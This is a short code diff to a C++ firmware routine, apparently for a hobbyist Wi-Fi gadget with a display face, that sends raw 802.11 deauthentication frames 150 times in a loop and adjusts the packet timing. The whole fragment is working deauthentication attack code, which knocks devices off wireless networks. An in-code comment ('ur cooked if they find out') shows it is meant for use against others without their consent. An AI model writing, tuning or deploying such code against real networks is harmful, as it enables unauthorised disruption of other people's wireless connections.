@@ -150,6 +150,7 @@ void Deauth::start() {
     // send the deauth 150 times(ur cooked if they find out)
     for (int i = 0; i < 150; ++i) {
         wifi_send_pkt_freedom(const_cast<uint8_t*>(deauthFrame), frameSize, 0);
+        delay(102);
         packets++;
 
         // calculate packets per second
@@ -162,7 +163,6 @@ void Deauth::start() {
             Serial.println(" pkt/s");
             Display::cleanDisplayFace("(>-<)");
             Display::attachSmallText("Packets per second: " + (String) pps + " pkt/s");
-            delay(100);
         }
     }
 
